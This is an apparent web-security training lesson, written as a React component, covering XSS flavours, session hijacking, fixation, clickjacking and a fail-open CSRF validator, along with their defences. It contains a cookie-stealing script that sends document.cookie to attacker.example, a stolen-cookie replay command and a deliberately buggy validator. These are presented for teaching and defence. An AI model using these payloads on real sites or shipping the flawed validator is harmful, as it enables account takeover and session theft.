import CodeBlock from '../../components/lesson/CodeBlock';
import Callout from '../../components/lesson/Callout';

export default function XssSessionAttacks() {
  return (
    <div className="prose-hh">
      <h1>XSS &amp; Session Attacks</h1>
      <p>
        Cross-Site Scripting (XSS) happens when user-controlled input is rendered back into a page without
        proper encoding, letting an attacker's HTML/JavaScript execute in another user's browser. It's the
        client-side counterpart to injection — same root cause (untrusted input treated as code), different
        execution context.
      </p>

      <h2>The three flavors</h2>
      <ul>
        <li><strong>Reflected XSS</strong> — the payload comes from the request (e.g. a search query
        parameter) and is immediately reflected back in the response. Requires tricking a victim into
        clicking a crafted link.</li>
        <li><strong>Stored XSS</strong> — the payload is saved server-side (a comment, a profile field)
        and served to every user who views that content later. Higher impact — no click-through needed.</li>
        <li><strong>DOM-based XSS</strong> — the vulnerability lives entirely in client-side JavaScript
        that unsafely writes attacker-controlled data (e.g. from <code>location.hash</code>) into the DOM,
        never touching the server at all.</li>
      </ul>

      <h2>Detecting reflected XSS</h2>
      <CodeBlock label="the core test">{`# baseline
curl "http://10.10.60.5/search?q=test"

# probe — does the app encode this, or reflect it verbatim?
curl "http://10.10.60.5/search?q=<script>alert(1)</script>"

# vulnerable response contains the tag UNENCODED:
#   <p>Results for: <script>alert(1)</script></p>
# safe response HTML-encodes it:
#   <p>Results for: &lt;script&gt;alert(1)&lt;/script&gt;</p>`}</CodeBlock>
      <p>
        This is the exact test you'll run in this module's lab — inspecting whether the raw payload comes
        back verbatim (vulnerable) or encoded (safe), which is precisely how a real tester confirms XSS
        before ever needing a browser.
      </p>

      <h2>What a real payload accomplishes</h2>
      <CodeBlock label="beyond alert(1) — a session-stealing payload">{`<script>
fetch('https://attacker.example/steal?c=' + document.cookie)
</script>`}</CodeBlock>
      <p>
        <code>alert(1)</code> only proves execution. In a real (authorized) test, the report-worthy impact
        is what you demonstrate <em>can</em> happen — exfiltrating session cookies, performing actions as
        the victim, or defacing content — always with client authorization for anything beyond a harmless
        proof-of-concept.
      </p>

      <h2>Automating discovery: Dalfox</h2>
      <p>
        Manually crafting a payload for one parameter at a time doesn't scale to a target with hundreds of
        parameters across dozens of pages. <strong>Dalfox</strong> is a dedicated XSS scanning tool built to
        close that gap — it automates parameter discovery, fires a large library of context-aware payloads
        at each one, and then verifies execution (rather than just guessing from a reflected string) using a
        headless browser.
      </p>
      <CodeBlock label="scanning a single URL with Dalfox">{`dalfox url https://target.com/search?q=FUZZ
# discovers reflected parameters, tries encoding/context-aware payload variants for each,
# and reports only the ones it actually confirmed execute — cutting down false positives`}</CodeBlock>
      <p>
        The same instinct from the detection test above — does the payload come back encoded or raw — is
        exactly what Dalfox automates at scale, plus the extra step of confirming real execution so you're
        not chasing false positives across a large target.
      </p>

      <h2>Session attacks: cookies and tokens</h2>
      <CodeBlock label="what to check on every session cookie">{`Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict

HttpOnly    -> JavaScript cannot read this cookie (mitigates XSS cookie theft)
Secure      -> only sent over HTTPS
SameSite    -> controls whether it's sent on cross-site requests (mitigates CSRF)`}</CodeBlock>
      <p>
        A session cookie missing <code>HttpOnly</code> is what makes the fetch-based theft payload above
        actually work — always check for its presence when testing session handling.
      </p>

      <h2>Session hijacking: what "stealing a cookie" actually gets you</h2>
      <p>
        A web session is, at its core, a single unpredictable string the server trusts to mean "this request
        came from the person who already logged in." Whoever presents that exact string — regardless of how
        they got it — <em>is</em> that user as far as the server is concerned. That is the entire mechanism
        behind session hijacking, and it is why it is so devastating: there is no password to guess, no MFA
        prompt to bypass, and no login event of the attacker's own to show up in an audit log. The three
        classic delivery mechanisms are worth knowing cold, because each one implies a different fix:
      </p>
      <ul>
        <li><strong>XSS cookie theft</strong> — a stored or reflected XSS payload runs in the victim's
        browser and exfiltrates <code>document.cookie</code> to an attacker-controlled endpoint. Fixed by
        both eliminating the XSS <em>and</em> setting <code>HttpOnly</code> so client-side JavaScript cannot
        read the cookie even if a payload does execute — defense in depth, not "pick one."</li>
        <li><strong>Network sniffing</strong> — on an unencrypted (or TLS-stripped) connection, a
        man-in-the-middle simply reads the session cookie off the wire. Fixed by <code>Secure</code> (never
        sent over plain HTTP) and HSTS to prevent downgrade in the first place.</li>
        <li><strong>Session fixation</strong> — covered in detail below; the attacker never intercepts
        anything, they simply choose the session ID in advance.</li>
      </ul>
      <CodeBlock label="the hijack in one line, once you have a valid cookie">{`curl -H "Cookie: session_id=<stolen-value>" https://target.example/account/dashboard
# if the server only checks "does a session with this ID exist and is it valid",
# this is functionally identical to a real login — no credentials involved at all`}</CodeBlock>

      <h2>Session fixation: choosing the victim's session ID in advance</h2>
      <p>
        Cookie theft requires intercepting something. Session fixation is subtler and needs no interception
        at all: if an application accepts a session identifier supplied by the client (via a URL parameter,
        a hidden form field, or simply failing to issue a fresh session ID at the moment of login) an
        attacker can mint a session ID themselves, deliver it to the victim (e.g. a link like
        <code>https://target.example/login?sessionid=ATTACKER00112233</code>), and simply wait. When the
        victim logs in normally with their own real credentials, the application authenticates that
        <em>same</em> attacker-chosen session ID. The attacker never has to see a single byte of the
        victim's traffic — they just have to guess correctly that the fix (regenerating the ID post-login)
        was never implemented.
      </p>
      <Callout variant="tip">
        <p>
          The single control that defeats session fixation: <strong>always issue a brand-new session
          identifier at the exact moment authentication succeeds</strong>, discarding whatever pre-auth
          session existed — regardless of whether that ID was server-generated or client-supplied.
        </p>
      </Callout>

      <h2>Clickjacking: making the victim's own click do the attack</h2>
      <p>
        Clickjacking (UI redress) does not steal anything at all — it weaponizes a victim's own genuine,
        authenticated click. An attacker overlays a sensitive page (e.g. "Delete my account" or "Transfer
        funds") in a fully transparent iframe, positioned exactly over an innocuous-looking decoy button
        ("Claim your free prize"). The victim sees only the decoy; the click they think they're making
        actually lands on the invisible, real button underneath — sent with their own real session cookie,
        indistinguishable from a request they knowingly intended. The fix is a response header, not
        application logic:
      </p>
      <CodeBlock label="the two headers that stop clickjacking outright">{`X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
# either one (ideally both) tells the browser to refuse to render this page inside any iframe at all`}</CodeBlock>

      <h2>CSRF, revisited: the "fail open" implementation bug</h2>
      <p>
        The token-based defense against CSRF sounds airtight in theory — but one of the most common ways it
        fails in practice is not a missing token, it's a validator that only checks the token <em>if one was
        supplied</em>, and silently processes the request when the parameter is omitted entirely. Code
        review sees "we validate the CSRF token" and moves on; nobody notices the implicit "and if there
        isn't one, we... don't reject it" branch until someone tries submitting the exact same request with
        the <code>csrf_token</code> field simply deleted.
      </p>
      <CodeBlock label="the fail-open bug in miniature">{`# what the developer intended:
if (submittedToken && submittedToken === session.csrfToken) { process(request) }
else { reject(request) }

# what was actually shipped:
if (submittedToken) {
  if (submittedToken === session.csrfToken) { process(request) }
  else { reject(request) }
}
process(request)  // <-- reached whenever submittedToken is simply absent`}</CodeBlock>
      <Callout variant="tip">
        <p>
          Whenever you test a CSRF-protected endpoint, don't stop at "invalid token gets rejected." Always
          also try the request with the token parameter <strong>removed entirely</strong> — a real, common
          bypass that a token-presence check alone will never catch.
        </p>
      </Callout>

      <Callout variant="danger">
        <p>
          Never run a real cookie-exfiltration payload against a target outside an authorized engagement —
          even a "proof of concept" alert box against a live third-party site without permission can be a
          computer misuse offense.
        </p>
      </Callout>
    </div>
  );
}
